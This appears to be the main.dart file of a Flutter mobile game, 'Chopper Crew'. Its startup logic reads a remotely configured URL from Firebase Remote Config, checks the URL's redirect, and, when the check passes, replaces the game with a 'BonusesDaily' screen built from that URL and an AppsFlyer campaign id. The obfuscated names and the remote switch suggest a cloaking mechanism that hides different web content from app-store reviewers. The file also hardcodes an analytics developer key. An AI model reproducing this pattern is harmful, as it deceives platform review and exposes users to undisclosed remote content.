import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:chopper_crew_app/chopper_crew_app.dart';
import 'package:chopper_crew_app/firebase_options.dart';
import 'package:chopper_crew_app/screens/chopper_dash/coins_bloc/coins_bloc.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/services.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'sevices/asd.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Ntfxs().activate();
  await reate();
  tracker();

  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
    DeviceOrientation.landscapeLeft,
    DeviceOrientation.landscapeRight
  ]);

  runApp(MultiBlocProvider(
    providers: [
      BlocProvider<CoinsBloc>(create: (context) => CoinsBloc()),
    ],
    child: FutureBuilder<bool>(
      future: checkBonusesDaily(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
            child: Center(
              child: Container(
                height: 70,
                width: 70,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(15),
                  child: Image.asset('assets/images/app_icon.png'),
                ),
              ),
            ),
          );
        } else {
          if (snapshot.data == true && reward != '') {
            return BonusesDaily(
              amount: reward,
            );
          } else {
            return ChopperCrewApp();
          }
        }
      },
    ),
  ));
}

Future<void> tracker() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

late SharedPreferences prex;
final fsd = InAppReview.instance;

Future<void> reate() async {
  await fs();
  bool alrefsda = prex.getBool('dsa') ?? false;
  if (!alrefsda) {
    if (await fsd.isAvailable()) {
      fsd.requestReview();
      await prex.setBool('dsa', true);
    }
  }
}

Future<void> fs() async {
  prex = await SharedPreferences.getInstance();
}

String reward = '';
String camp = '';
Future<bool> checkBonusesDaily() async {
  final datax = FirebaseRemoteConfig.instance;
  await datax.fetchAndActivate();
  String fds = datax.getString('choop');
  String exampleValue = datax.getString('chopp');
  final client = HttpClient();
  var uri = Uri.parse(fds);
  var request = await client.getUrl(uri);
  request.followRedirects = false;
  var response = await request.close();
  tracker();
  AppsFlyerOptions appsFlyerOptions = AppsFlyerOptions(
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6480248061',
    showDebug: false,
    timeToWaitForATTUserAuthorization: 50,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );

  AppsflyerSdk appsflyerSdk = AppsflyerSdk(appsFlyerOptions);
  appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true);
  appsflyerSdk.onInstallConversionData((data) {
    camp = data['campaignId'];
  });
  if (!fds.contains('nonechopp')) {
    if (response.headers.value(HttpHeaders.locationHeader).toString() !=
        exampleValue) {
      reward = '$fds&campaignid=$camp';
      return true;
    }
  }
  return false;
}
